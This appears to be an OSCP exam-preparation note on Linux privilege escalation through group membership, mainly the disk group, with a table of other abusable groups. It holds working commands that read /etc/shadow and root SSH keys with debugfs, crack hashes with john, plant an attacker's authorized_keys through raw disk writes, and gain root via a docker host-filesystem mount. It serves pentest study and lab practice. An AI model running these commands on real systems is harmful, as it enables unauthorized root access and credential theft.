---
title: "Linux Groups"
slug: linux-groups
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-25T19:48:47+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "A supplementary group is an access-control grant that nothing in the user's own home reflects."
---
A supplementary group is an access-control grant that nothing in the user's own home reflects. Some groups exist to hand out access to a device or a socket, and a device is the raw form of the thing the permission model protects, so membership can be root with one extra step. `id` prints the groups on landing and it is easy to skim past. [LinPEAS](/collections/oscp/linpeas) flags the interesting ones in its user information section.

```bash
id                        # uid=1001(dora) gid=1001(dora) groups=1001(dora),6(disk)
groups
grep "$(whoami)" /etc/group
```

Anything past the user's own primary group is worth a look. The full list of members per group is in `/etc/group`, covered in [Linux Permissions](/collections/oscp/linux-permissions).

## disk

Members of `disk` hold read and write on the block devices in `/dev`, which is the filesystem underneath the permission model. Every file on that disk can be read regardless of its mode, including `/etc/shadow` and root's SSH keys. Write is just as raw and a bad write corrupts a mounted filesystem, so reading is the practical use. Extplorer fell this way.

Find the device holding `/`:

```bash
df -h        # or lsblk, or mount | grep ' / '
```

```text
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.2G  4.2G  56% /
/dev/sda2                          1.7G  209M  1.4G  13% /boot
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
```

Take the device mounted on `/` and ignore the rest: `/dev/loop*` are snap packages, tmpfs is memory, and a separate `/boot` holds no `/etc`. The mapper name is LVM, volume group `ubuntu-vg` and logical volume `ubuntu-lv`, where device-mapper escapes each `-` in a name as `--`.

`debugfs` is the ext2/3/4 filesystem debugger and reads the device directly, ignoring file permissions:

```bash
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs:  cat /etc/shadow
debugfs:  ls -l /root
debugfs:  cat /root/.ssh/id_rsa
debugfs:  rdump /root /tmp          # recursive copy out to a normal path
```

`-w` opens the device read/write. Reading hashes and keys does not need it, so leave it off unless there is a reason to write.

`-R` runs one command and exits, which is the usable form over a raw shell where an interactive prompt misbehaves:

```bash
debugfs -R "cat /etc/shadow" /dev/mapper/ubuntu--vg-ubuntu--lv
```

From there it is the standard shadow route. Pull `/etc/passwd` and `/etc/shadow` to Kali, combine them so john gets usernames with the hashes, and crack:

```bash
unshadow passwd.txt shadow.txt > creds.txt
john --wordlist=/usr/share/wordlists/rockyou.txt creds.txt
su root
```

A `$6$` root hash that does not crack is not the end of it. `/root/.ssh/id_rsa` read through debugfs is the other way in, subject to the key permission rules in [SSH Key Access](/collections/oscp/ssh-key-access), and any config or history file under `/root` is readable the same way. Hash details are in [Password Cracking](/collections/oscp/password-cracking), the same file read from the other direction in [Weak File Permissions](/collections/oscp/weak-file-permissions).

`debugfs` only understands ext filesystems. XFS has `xfs_db -r <device>`. Failing both, the device can be read as bytes:

```bash
dd if=/dev/sda1 | strings | grep -i 'root:\$'
```

### No shadow hash cracks, no key exists

Both routes above are reads. `-w` opens the same device for writing, and `debugfs`'s `write` command copies a local file into the filesystem at a given path, which turns raw disk access into an arbitrary-write primitive without ever calling `mount`, so no `CAP_SYS_ADMIN` is needed:

```bash
ssh-keygen -f evilkey -N ""                # generates evilkey and evilkey.pub locally
cp evilkey.pub authorized_keys

debugfs -w /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs:  cd /root/.ssh                    # or: cd /root, then mkdir .ssh
debugfs:  write authorized_keys authorized_keys
```

The new inode is owned by whatever uid ran `debugfs`, not root, and `sshd`'s `StrictModes` rejects an `authorized_keys` it does not own. Fix the inode fields directly, still inside `debugfs`:

```text
debugfs:  sif authorized_keys uid 0
debugfs:  sif authorized_keys gid 0
debugfs:  sif authorized_keys mode 0100600
```

`sif <path> <field> <value>` sets one inode field at a time; do the same `uid`/`gid` fix on `.ssh` itself (`mode 040700`) if `mkdir` created it fresh. `ssh -i evilkey root@TARGET` from there.

The same `write`/`sif` pair drops a cron job, replaces a script a root timer runs, or overwrites `/etc/passwd` with a crafted root-equivalent line when no SSH service is listening at all. Read first, since a key or a crackable hash is less to get wrong than a raw write, but this is the fallback when Fanatastic's shortcut (a plaintext `id_rsa` just sitting there) isn't available.

## Other Groups Worth Flagging

| Group | Grants | Route |
| --- | --- | --- |
| `disk` | raw block devices | debugfs, above |
| `shadow` | read `/etc/shadow` | crack the root hash |
| `adm` | read `/var/log` | no root by itself, but logs carry credentials and command lines |
| `docker` | the docker socket | the daemon runs as root, so a container mounting the host filesystem is root |
| `lxd` / `lxc` | container management | launch a privileged container with the host `/` mounted |
| `sudo` / `wheel` | sudo rights | only useful with a password, then [Sudo](/collections/oscp/sudo) |
| `video` | `/dev/fb0` | read the console framebuffer as an image |

The docker case is one command, since the mount happens as root inside the container:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

That needs outbound internet to pull `alpine`. Without it, check what is already local and swap the image in:

```bash
docker images
docker run -v /:/mnt --rm -it <repository>:<tag> chroot /mnt sh
```

On Peppo the host had no egress at all, but `docker images` still listed `redmine` and `postgres`, the same two services already enumerated on the box, since it was running them itself as containers. Either one has a working shell, so the mount trick worked unchanged with `redmine` in place of `alpine`.

## Where This Sits

Group membership is a zero-cost check because `id` already ran during the first steps of [Privilege Escalation](/collections/oscp/privilege-escalation-linux). It is worth treating as its own vector because enumeration scripts report it as information rather than as a finding, and because the primitive is unusual: no writable file, no SUID bit, no version to match, just a device that answers to a group.
